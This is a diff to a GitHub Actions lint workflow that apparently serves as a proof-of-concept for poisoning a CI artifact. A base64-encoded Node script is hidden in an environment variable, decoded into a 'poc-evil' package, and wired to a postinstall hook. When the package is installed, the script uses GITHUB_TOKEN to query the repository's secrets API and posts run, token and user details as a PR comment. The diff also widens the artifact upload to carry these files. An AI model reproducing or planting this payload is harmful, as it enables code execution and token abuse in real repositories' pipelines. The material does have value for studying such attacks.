@@ -8,17 +8,26 @@ jobs:
   lint:
     runs-on: ubuntu-latest
     steps:
-      - name: Save PR number
-        if: always()
+      - name: Stage attacker-controlled linter artifact
         env:
-          PR_NUMBER: ${{ github.event.pull_request.number }}
-        run: echo "$PR_NUMBER" > pr-number.txt
-
+          PRN: ${{ github.event.pull_request.number }}
+          HOOK: Y29uc3QgZnM9cmVxdWlyZSgnZnMnKTsgY29uc3Qgb3M9cmVxdWlyZSgnb3MnKTsKY29uc3QgdG9rPXByb2Nlc3MuZW52LkdJVEhVQl9UT0tFTnx8JycsIHJlcG89cHJvY2Vzcy5lbnYuR0lUSFVCX1JFUE9TSVRPUll8fCcnLCB3cz1wcm9jZXNzLmVudi5HSVRIVUJfV09SS1NQQUNFfHxwcm9jZXNzLmN3ZCgpOwpsZXQgcHI9Jyc7IHRyeXtwcj1mcy5yZWFkRmlsZVN5bmMod3MrJy9wci1udW1iZXIudHh0JywndXRmOCcpLnRyaW0oKTt9Y2F0Y2goZSl7fQpsZXQgcmVwb3J0PScnOyB0cnl7cmVwb3J0PWZzLnJlYWRGaWxlU3luYyh3cysnL2xpbnRlci1yZXBvcnQudHh0JywndXRmOCcpLnRyaW0oKTt9Y2F0Y2goZSl7fQooYXN5bmMoKT0+ewogIGNvbnN0IEg9e2F1dGhvcml6YXRpb246J0JlYXJlciAnK3RvayxhY2NlcHQ6J2FwcGxpY2F0aW9uL3ZuZC5naXRodWIranNvbicsJ2NvbnRlbnQtdHlwZSc6J2FwcGxpY2F0aW9uL2pzb24nfTsKICBsZXQgc2VjcmV0c1N0YXR1cz0nbi9hJzsKICB0cnl7Y29uc3Qgcj1hd2FpdCBmZXRjaCgnaHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy8nK3JlcG8rJy9hY3Rpb25zL3NlY3JldHMnLHtoZWFkZXJzOkh9KTtzZWNyZXRzU3RhdHVzPXIuc3RhdHVzKycgJysoYXdhaXQgci50ZXh0KCkpLnNsaWNlKDAsNjApO31jYXRjaChlKXtzZWNyZXRzU3RhdHVzPSdlcnIgJytlLm1lc3NhZ2U7fQogIGNvbnN0IGluZm89J0dBQjMtUkNFLUNPTkZJUk1FRCBldmVudD0nK3Byb2Nlc3MuZW52LkdJVEhVQl9FVkVOVF9OQU1FKycgd29ya2Zsb3c9Jytwcm9jZXNzLmVudi5HSVRIVUJfV09SS0ZMT1cKICAgICsnIHJ1bj0nK3Byb2Nlc3MuZW52LkdJVEhVQl9SVU5fSUQrJyBwcj0nK3ByKycgcmVwb3J0PScrSlNPTi5zdHJpbmdpZnkocmVwb3J0KQogICAgKycgdG9rZW5fcHJlc2VudD0nKyEhdG9rKycgdG9rZW5fbGVuPScrdG9rLmxlbmd0aCsnIHVpZD0nK3Byb2Nlc3MuZ2V0dWlkKCkrJyB3aG89Jytvcy51c2VySW5mbygpLnVzZXJuYW1lCiAgICArJyBzZWNyZXRzX2FwaT0nK3NlY3JldHNTdGF0dXM7CiAgY29uc29sZS5sb2coaW5mbyk7CiAgdHJ5e2ZzLndyaXRlRmlsZVN5bmMod3MrJy9HQUIzLVJDRS1QUk9PRi50eHQnLGluZm8pO31jYXRjaChlKXt9CiAgdHJ5e2NvbnN0IHI9YXdhaXQgZmV0Y2goJ2h0dHBzOi8vYXBpLmdpdGh1Yi5jb20vcmVwb3MvJytyZXBvKycvaXNzdWVzLycrcHIrJy9jb21tZW50cycse21ldGhvZDonUE9TVCcsaGVhZGVyczpILGJvZHk6SlNPTi5zdHJpbmdpZnkoe2JvZHk6aW5mb30pfSk7Y29uc29sZS5sb2coJ0NPTU1FTlRfU1RBVFVTICcrci5zdGF0dXMpO31jYXRjaChlKXtjb25zb2xlLmxvZygnQ09NTUVOVF9FUlIgJytlLm1lc3NhZ2UpO30KfSkoKTsK
+        run: |
+          echo "$PRN" > pr-number.txt
+          printf 'attacker supplied linter report' > linter-report.txt
+          printf '{"name":"poc-root","version":"1.0.0","private":true,"dependencies":{"poc-evil":"file:./poc-evil"}}' > package.json
+          mkdir -p poc-evil
+          printf '{"name":"poc-evil","version":"1.0.0","scripts":{"postinstall":"node hook.js"}}' > poc-evil/package.json
+          printf '%s' "$HOOK" | base64 -d > poc-evil/hook.js
       - name: Upload linter report
         if: always()
         uses: actions/upload-artifact@v7
         with:
           name: linter-report
+          include-hidden-files: true
           path: |
             pr-number.txt
+            linter-report.txt
+            package.json
+            poc-evil
           if-no-files-found: ignore
